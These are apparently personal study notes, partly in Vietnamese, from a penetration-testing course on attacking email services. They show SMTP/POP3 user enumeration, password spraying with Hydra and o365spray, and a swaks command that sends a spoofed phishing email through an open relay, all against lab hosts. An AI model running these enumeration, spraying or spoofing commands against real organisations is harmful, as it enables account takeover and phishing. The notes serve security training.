Mail sử dụng SNMP 

it will connect to a POP3 or IMAP4 server on the Internet,
  POP3 để đồng bộ mail đến client. Server sẽ xoá mail khi được lấy đi -> bất tiện khi dùng 2 thiết bị mail 1 tài khoản nhưng mail server không lưu trữ quá nhiều
  IMAP để lấy mail từ server 

## Enumeration
Email servers are complex and usually require us to enumerate multiple servers, ports, and services. Furthermore, today most companies have their email services in the cloud with services such as Microsoft 365 or G-Suite. Therefore, our approach to attacking the email service depends on the service in use.

We can use the Mail eXchanger (MX) DNS record to identify a mail server. The MX record specifies the mail server responsible for accepting email messages on behalf of a domain name. It is possible to configure several MX records, typically pointing to an array of mail servers for load balancing and redundancy.

We can use tools such as host or dig and online websites such as MXToolbox to query information about the MX records:
(https://mxtoolbox.com/)

Host - MX Records 
```
[!bash!]$ host -t MX hackthebox.eu

hackthebox.eu mail is handled by 1 aspmx.l.google.com.
[!bash!]$ host -t MX microsoft.com

microsoft.com mail is handled by 10 microsoft-com.mail.protection.outlook.com.
```
Mục đích: Xác định hệ thống mail của domain



DIG - MX Records
```
[!bash!]$ dig mx plaintext.do | grep "MX" | grep -v ";"

plaintext.do.           7076    IN      MX      50 mx3.zoho.com.
plaintext.do.           7076    IN      MX      10 mx.zoho.com.
plaintext.do.           7076    IN      MX      20 mx2.zoho.com.
[!bash!]$ dig mx inlanefreight.com | grep "MX" | grep -v ";"

inlanefreight.com.      300     IN      MX      10 mail1.inlanefreight.com.
```
Mục đích : Cũng là MX record, nhưng dùng dig (chi tiết hơn host)


Host - A Records
```
[!bash!]$ host -t A mail1.inlanefreight.htb.

mail1.inlanefreight.htb has address 10.129.14.128
```
Mục đích :
 - Tìm IP thật của server (mail/web/internal host)
 - Hay dùng sau khi đã biết MX

Port	  Service
TCP/25	SMTP Unencrypted
TCP/143	IMAP4 Unencrypted
TCP/110	POP3 Unencrypted
TCP/465	SMTP Encrypted
TCP/587	SMTP Encrypted/STARTTLS
TCP/993	IMAP4 Encrypted
TCP/995	POP3 Encrypted


We can use Nmap's default script -sC option to enumerate those ports on the target system:
```
[!bash!]$ sudo nmap -Pn -sV -sC -p25,143,110,465,587,993,995 10.129.14.128

Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-27 17:56 CEST
Nmap scan report for 10.129.14.128
Host is up (0.00025s latency).

PORT   STATE SERVICE VERSION
25/tcp open  smtp    Postfix smtpd
|_smtp-commands: mail1.inlanefreight.htb, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING, 
MAC Address: 00:00:00:00:00:00 (VMware)
```

## Misconfigurations

Email services use authentication to allow users to send emails and receive emails. A misconfiguration can happen when the SMTP service allows anonymous authentication or support protocols that can be used to enumerate valid usernames.

# Authentication
The SMTP server has different commands that can be used to enumerate valid usernames VRFY, EXPN, and RCPT TO. If we successfully enumerate valid usernames, we can attempt to password spray, brute-forcing, or guess a valid password. So let's explore how those commands work.
VRFY this command instructs the receiving SMTP server to check the validity of a particular email username. The server will respond, indicating if the user exists or not. This feature can be disabled.

# VRFY Command
```
[!bash!]$ telnet 10.10.110.20 25

Trying 10.10.110.20...
Connected to 10.10.110.20.
Escape character is '^]'.
220 parrot ESMTP Postfix (Debian/GNU)

VRFY root

252 2.0.0 root

VRFY www-data

252 2.0.0 www-data

VRFY new-user

550 5.1.1 <new-user>: Recipient address rejected: User unknown in local recipient table
```
EXPN is similar to VRFY, except that when used with a distribution list, it will list all users on that list. This can be a bigger problem than the VRFY command since sites often have an alias such as "all."

# EXPN Command
```
[!bash!]$ telnet 10.10.110.20 25

Trying 10.10.110.20...
Connected to 10.10.110.20.
Escape character is '^]'.
220 parrot ESMTP Postfix (Debian/GNU)


EXPN john

250 2.1.0 john@inlanefreight.htb


EXPN support-team

250 2.0.0 carol@inlanefreight.htb
250 2.1.5 elisa@inlanefreight.htb
```

RCPT TO identifies the recipient of the email message. This command can be repeated multiple times for a given message to deliver a single message to multiple recipients.

# RCPT TO Command
```
[!bash!]$ telnet 10.10.110.20 25

Trying 10.10.110.20...
Connected to 10.10.110.20.
Escape character is '^]'.
220 parrot ESMTP Postfix (Debian/GNU)


MAIL FROM:test@htb.com
it is
250 2.1.0 test@htb.com... Sender ok


RCPT TO:julio

550 5.1.1 julio... User unknown


RCPT TO:kate

550 5.1.1 kate... User unknown


RCPT TO:john

250 2.1.5 john... Recipient ok
```

We can also use the POP3 protocol to enumerate users depending on the service implementation. For example, we can use the command USER followed by the username, and if the server responds OK. This means that the user exists on the server.

# USER Command
```
[!bash!]$ telnet 10.10.110.20 110

Trying 10.10.110.20...
Connected to 10.10.110.20.
Escape character is '^]'.
+OK POP3 Server ready

USER julio

-ERR


USER john

+OK
```

To automate our enumeration process, we can use a tool named smtp-user-enum. We can specify the enumeration mode with the argument -M followed by VRFY, EXPN, or RCPT, and the argument -U with a file containing the list of users we want to enumerate. Depending on the server implementation and enumeration mode, we need to add the domain for the email address with the argument -D. Finally, we specify the target with the argument -t.
```
[!bash!]$ smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7

Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Mode ..................... RCPT
Worker Processes ......... 5
Usernames file ........... userlist.txt
Target count ............. 1
Username count ........... 78
Target TCP port .......... 25
Query timeout ............ 5 secs
Target domain ............ inlanefreight.htb

######## Scan started at Thu Apr 21 06:53:07 2022 #########
10.129.203.7: jose@inlanefreight.htb exists
10.129.203.7: pedro@inlanefreight.htb exists
10.129.203.7: kate@inlanefreight.htb exists
######## Scan completed at Thu Apr 21 06:53:18 2022 #########
3 results.

78 queries in 11 seconds (7.1 queries / sec)
```

# Cloud Enumeration
As discussed, cloud service providers use their own implementation for email services. Those services commonly have custom features that we can abuse for operation, such as username enumeration. Let's use Office 365 as an example and explore how we can enumerate usernames in this cloud platform.

O365spray is a username enumeration and password spraying tool aimed at Microsoft Office 365 (O365) developed by ZDH. This tool reimplements a collection of enumeration and spray techniques researched and identified by those mentioned in Acknowledgments. Let's first validate if our target domain is using Office 365.

# O365 Spray
```
[!bash!]$ python3 o365spray.py --validate --domain msplaintext.xyz

            *** O365 Spray ***            

>----------------------------------------<

   > version        :  2.0.4
   > domain         :  msplaintext.xyz
   > validate       :  True
   > timeout        :  25 seconds
   > start          :  2022-04-13 09:46:40

>----------------------------------------<

[2022-04-13 09:46:40,344] INFO : Running O365 validation for: msplaintext.xyz
[2022-04-13 09:46:40,743] INFO : [VALID] The following domain is using O365: msplaintext.xyz
```

Now, we can attempt to identify usernames.
```
[!bash!]$ python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz        
                                       
            *** O365 Spray ***             

>----------------------------------------<

   > version        :  2.0.4
   > domain         :  msplaintext.xyz
   > enum           :  True
   > userfile       :  users.txt
   > enum_module    :  office
   > rate           :  10 threads
   > timeout        :  25 seconds
   > start          :  2022-04-13 09:48:03

>----------------------------------------<

[2022-04-13 09:48:03,621] INFO : Running O365 validation for: msplaintext.xyz
[2022-04-13 09:48:04,062] INFO : [VALID] The following domain is using O365: msplaintext.xyz
[2022-04-13 09:48:04,064] INFO : Running user enumeration against 67 potential users
[2022-04-13 09:48:08,244] INFO : [VALID] lewen@msplaintext.xyz
[2022-04-13 09:48:10,415] INFO : [VALID] juurena@msplaintext.xyz
[2022-04-13 09:48:10,415] INFO : 

[ * ] Valid accounts can be found at: '/opt/o365spray/enum/enum_valid_accounts.2204130948.txt'
[ * ] All enumerated accounts can be found at: '/opt/o365spray/enum/enum_tested_accounts.2204130948.txt'

[2022-04-13 09:48:10,416] INFO : Valid Accounts: 2
```

## Password Attacks

We can use Hydra to perform a password spray or brute force against email services such as SMTP, POP3, or IMAP4. First, we need to get a username list and a password list and specify which service we want to attack. Let us see an example for POP3.

# Hydra - Password Attack
```
[!bash!]$ hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-04-13 11:37:46
[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
[DATA] max 16 tasks per 1 server, overall 16 tasks, 67 login tries (l:67/p:1), ~5 tries per task
[DATA] attacking pop3://10.10.110.20:110/
[110][pop3] host: 10.129.42.197   login: john   password: Company01!
1 of 1 target successfully completed, 1 valid password found
```

If cloud services support SMTP, POP3, or IMAP4 protocols, we may be able to attempt to perform password spray using tools like Hydra, but these tools are usually blocked. We can instead try to use custom tools such as o365spray or MailSniper for Microsoft Office 365 or CredKing for Gmail or Okta. Keep in mind that these tools need to be up-to-date because if the service provider changes something (which happens often), the tools may not work anymore. This is a perfect example of why we must understand what our tools are doing and have the know-how to modify them if they do not work properly for some reason.
https://github.com/0xZDH/o365spray
https://github.com/dafthack/MailSniper
https://github.com/ustayready/CredKing

O365 Spray - Password Spraying
```
[!bash!]$ python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz

            *** O365 Spray ***            

>----------------------------------------<

   > version        :  2.0.4
   > domain         :  msplaintext.xyz
   > spray          :  True
   > password       :  March2022!
   > userfile       :  usersfound.txt
   > count          :  1 passwords/spray
   > lockout        :  1.0 minutes
   > spray_module   :  oauth2
   > rate           :  10 threads
   > safe           :  10 locked accounts
   > timeout        :  25 seconds
   > start          :  2022-04-14 12:26:31

>----------------------------------------<

[2022-04-14 12:26:31,757] INFO : Running O365 validation for: msplaintext.xyz
[2022-04-14 12:26:32,201] INFO : [VALID] The following domain is using O365: msplaintext.xyz
[2022-04-14 12:26:32,202] INFO : Running password spray against 2 users.
[2022-04-14 12:26:32,202] INFO : Password spraying the following passwords: ['March2022!']
[2022-04-14 12:26:33,025] INFO : [VALID] lewen@msplaintext.xyz:March2022!
[2022-04-14 12:26:33,048] INFO : 

[ * ] Writing valid credentials to: '/opt/o365spray/spray/spray_valid_credentials.2204141226.txt'
[ * ] All sprayed credentials can be found at: '/opt/o365spray/spray/spray_tested_credentials.2204141226.txt'

[2022-04-14 12:26:33,048] INFO : Valid Credentials: 1
```

Protocol Specifics Attacks
An open relay is a Simple Mail Transfer Protocol (SMTP) server, which is improperly configured and allows an unauthenticated email relay. Messaging servers that are accidentally or intentionally configured as open relays allow mail from any source to be transparently re-routed through the open relay server. This behavior masks the source of the messages and makes it look like the mail originated from the open relay server.

Open Relay
From an attacker's standpoint, we can abuse this for phishing by sending emails as non-existing users or spoofing someone else's email. For example, imagine we are targeting an enterprise with an open relay mail server, and we identify they use a specific email address to send notifications to their employees. We can send a similar email using the same address and add our phishing link with this information. With the nmap smtp-open-relay script, we can identify if an SMTP port allows an open relay.
```
[!bash!]# nmap -p25 -Pn --script smtp-open-relay 10.10.11.213

Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-28 23:59 EDT
Nmap scan report for 10.10.11.213
Host is up (0.28s latency).

PORT   STATE SERVICE
25/tcp open  smtp
|_smtp-open-relay: Server is an open relay (14/16 tests)
```

Next, we can use any mail client to connect to the mail server and send our email.
```
[!bash!]# swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Company Notification' --body 'Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/' --server 10.10.11.213

=== Trying 10.10.11.213:25...
=== Connected to 10.10.11.213.
<-  220 mail.localdomain SMTP Mailer ready
 -> EHLO parrot
<-  250-mail.localdomain
<-  250-SIZE 33554432
<-  250-8BITMIME
<-  250-STARTTLS
<-  250-AUTH LOGIN PLAIN CRAM-MD5 CRAM-SHA1
<-  250 HELP
 -> MAIL FROM:<notifications@inlanefreight.com>
<-  250 OK
 -> RCPT TO:<employees@inlanefreight.com>
<-  250 OK
 -> DATA
<-  354 End data with <CR><LF>.<CR><LF>
 -> Date: Thu, 29 Oct 2020 01:36:06 -0400
 -> To: employees@inlanefreight.com
 -> From: notifications@inlanefreight.com
 -> Subject: Company Notification
 -> Message-Id: <20201029013606.775675@parrot>
 -> X-Mailer: swaks v20190914.0 jetmore.org/john/code/swaks/
 -> 
 -> Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/
 -> 
 -> 
 -> .
<-  250 OK
 -> QUIT
<-  221 Bye
=== Connection closed with remote host.
```

1. Bối cảnh và Mục đích Tấn công
  • Máy chủ chuyển tiếp mở (Open Relay): Một máy chủ chuyển tiếp mở là máy chủ Giao thức Truyền thư Đơn giản (SMTP) được cấu hình sai, cho phép chuyển tiếp email mà không cần xác thực (unauthenticated email relay).
  • Mục đích: Kẻ tấn công lợi dụng máy chủ này để gửi email, làm che giấu nguồn gốc thực sự của thư, khiến thư trông như thể nó xuất phát từ máy chủ chuyển tiếp mở. Trong trường hợp này, kẻ tấn công đang lạm dụng máy chủ để thực hiện cuộc tấn công lừa đảo (phishing).
  • Phát hiện Open Relay: Các nguồn cho thấy máy chủ tại địa chỉ 10.10.11.213 đã được xác định là một máy chủ chuyển tiếp mở thông qua công cụ Nmap.
2. Giải thích Lệnh swaks
Công cụ swaks (Swiss Army Knife for SMTP) được sử dụng để tạo và gửi email thủ công thông qua giao thức SMTP (Simple Mail Transfer Protocol).
  • swaks --from notifications@inlanefreight.com: Kẻ tấn công đang giả mạo (spoofing) địa chỉ email người gửi là notifications@inlanefreight.com. Việc sử dụng địa chỉ đáng tin cậy này nhằm mục đích lừa nhân viên công ty tin rằng đây là thông báo hợp pháp từ nội bộ.
  • --to employees@inlanefreight.com: Xác định người nhận.
  • --header 'Subject: Company Notification': Tiêu đề thư được thiết lập để trông giống như một thông báo chính thức của công ty.
  • --body '... http://mycustomphishinglink.com/': Nội dung thư chứa một liên kết lừa đảo tùy chỉnh (http://mycustomphishinglink.com/), mục đích là thu thập thông tin hoặc lây nhiễm phần mềm độc hại.
  • --server 10.10.11.213: Chỉ định máy chủ SMTP mục tiêu, vốn đã được xác định là máy chủ chuyển tiếp mở.
3. Phân tích Giao tiếp SMTP
  Phần ghi lại nhật ký thể hiện quy trình gửi thư qua giao thức SMTP (thường chạy trên cổng 25, cổng SMTP không mã hóa):






















